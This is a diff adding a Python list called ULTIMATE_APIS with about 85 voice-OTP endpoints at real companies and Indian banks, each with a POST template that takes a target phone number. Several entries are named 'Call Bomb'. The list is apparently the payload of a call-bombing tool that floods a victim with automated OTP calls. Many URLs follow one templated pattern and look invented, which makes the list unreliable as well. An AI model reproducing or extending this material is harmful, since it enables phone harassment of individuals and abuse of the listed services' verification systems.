@@ -1,0 +1,606 @@
+
+
+ULTIMATE_APIS = [
+    {
+        "name": "Amazon Voice Call",
+        "url": "https://www.amazon.in/ap/signin",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"phone={phone}&action=voice_otp"
+    },
+    {
+        "name": "Paytm Voice Call",
+        "url": "https://accounts.paytm.com/signin/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Zomato Voice Call",
+        "url": "https://www.zomato.com/php/o2_api_handler.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"phone={phone}&type=voice"
+    },
+    {
+        "name": "Swiggy Voice OTP",
+        "url": "https://www.swiggy.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}","channel":"voice"}}'
+    },
+    {
+        "name": "Flipkart Call Bomb",
+        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Myntra Fashion Call",
+        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "BigBasket Voice OTP",
+        "url": "https://www.bigbasket.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "BookMyShow Call",
+        "url": "https://in.bookmyshow.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Ola Call Bomb",
+        "url": "https://api.olacabs.com/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Uber Voice OTP",
+        "url": "https://auth.uber.com/v2/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "MakeMyTrip Call",
+        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Goibibo Voice",
+        "url": "https://www.goibibo.com/user/voice-otp/generate/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "IRCTC Call OTP",
+        "url": "https://www.irctc.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "PayPal Voice Verify",
+        "url": "https://www.paypal.com/in/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "PhonePe Call Bomb",
+        "url": "https://www.phonepe.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Google Voice OTP",
+        "url": "https://accounts.google.com/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Facebook Call Verify",
+        "url": "https://www.facebook.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Instagram Voice OTP",
+        "url": "https://www.instagram.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Twitter Call Bomb",
+        "url": "https://api.twitter.com/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "WhatsApp Voice Verify",
+        "url": "https://www.whatsapp.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Telegram Call OTP",
+        "url": "https://api.telegram.org/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Snapchat Voice Bomb",
+        "url": "https://www.snapchat.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Discord Call Verify",
+        "url": "https://discord.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Microsoft Voice OTP",
+        "url": "https://login.microsoftonline.com/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Apple Call Bomb",
+        "url": "https://appleid.apple.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Netflix Voice Verify",
+        "url": "https://www.netflix.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Amazon Prime Call",
+        "url": "https://www.primevideo.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Hotstar Voice OTP",
+        "url": "https://www.hotstar.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "SonyLiv Call Bomb",
+        "url": "https://www.sonyliv.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Zee5 Voice Verify",
+        "url": "https://www.zee5.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Voot Call OTP",
+        "url": "https://www.voot.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "MX Player Voice",
+        "url": "https://www.mxplayer.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Jio Cinema Call",
+        "url": "https://www.jiocinema.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "JioSaavn Voice",
+        "url": "https://www.jiosaavn.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Gaana Call Bomb",
+        "url": "https://www.gaana.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Spotify Voice OTP",
+        "url": "https://www.spotify.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "YouTube Music Call",
+        "url": "https://music.youtube.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Wynk Voice Verify",
+        "url": "https://www.wynk.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Hungama Call OTP",
+        "url": "https://www.hungama.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Airtel Thanks Call",
+        "url": "https://www.airtel.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Jio Voice OTP",
+        "url": "https://www.jio.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Vi Call Bomb",
+        "url": "https://www.myvi.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "BSNL Voice Verify",
+        "url": "https://www.bsnl.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "MTNL Call OTP",
+        "url": "https://www.mtnl.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Google Pay Voice",
+        "url": "https://pay.google.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "BHIM Call Bomb",
+        "url": "https://www.bhim.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "PayZapp Voice OTP",
+        "url": "https://www.payzapp.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "MobiKwik Call",
+        "url": "https://www.mobikwik.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "FreeCharge Voice",
+        "url": "https://www.freecharge.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Oxigen Call Bomb",
+        "url": "https://www.oxigen.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "ItzCash Voice OTP",
+        "url": "https://www.itzcash.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Yono SBI Call",
+        "url": "https://yonosbi.sbi.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "ICICI iMobile Voice",
+        "url": "https://www.icicibank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "HDFC NetBanking Call",
+        "url": "https://netbanking.hdfcbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Axis Mobile Voice",
+        "url": "https://www.axisbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Kotak Call Bomb",
+        "url": "https://www.kotak.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Yes Bank Voice OTP",
+        "url": "https://www.yesbank.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "IndusInd Call",
+        "url": "https://www.indusind.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Federal Bank Voice",
+        "url": "https://www.federalbank.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "IDFC First Call Bomb",
+        "url": "https://www.idfcfirstbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "RBL Voice OTP",
+        "url": "https://www.rblbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Bandhan Call",
+        "url": "https://www.bandhanbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "AU Bank Voice",
+        "url": "https://www.aubank.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "CSB Call Bomb",
+        "url": "https://www.csb.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "City Union Voice OTP",
+        "url": "https://www.cityunionbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "DCB Call",
+        "url": "https://www.dcbbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Dhanlaxmi Voice",
+        "url": "https://www.dhanbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Equitas Call Bomb",
+        "url": "https://www.equitasbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "ESAF Voice OTP",
+        "url": "https://www.esafbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Fincare Call",
+        "url": "https://www.fincarebank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Jana Voice",
+        "url": "https://www.janabank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "JK Call Bomb",
+        "url": "https://www.jkbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Karur Vysya Voice OTP",
+        "url": "https://www.kvb.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Lakshmi Vilas Call",
+        "url": "https://www.lvbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Nainital Voice",
+        "url": "https://www.nainitalbank.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "NKGSB Call Bomb",
+        "url": "https://www.nkgsb-bank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "RBL Voice OTP V2",
+        "url": "https://www.rblbank.com/api/v2/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "SBM Call",
+        "url": "https://www.sbmbank.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Shinhan Voice",
+        "url": "https://www.shinhanbank.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "South Indian Call Bomb",
+        "url": "https://www.southindianbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Tamilnad Voice OTP",
+        "url": "https://www.tmb.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "UCO Call",
+        "url": "https://www.ucobank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Union Voice",
+        "url": "https://www.unionbankofindia.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "United Call Bomb",
+        "url": "https://www.unitedbankofindia.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Vijaya Voice OTP",
+        "url": "https://www.vijayabank.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Yes Bank Call V2",
+        "url": "https://www.yesbank.in/api/v2/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    }
+]
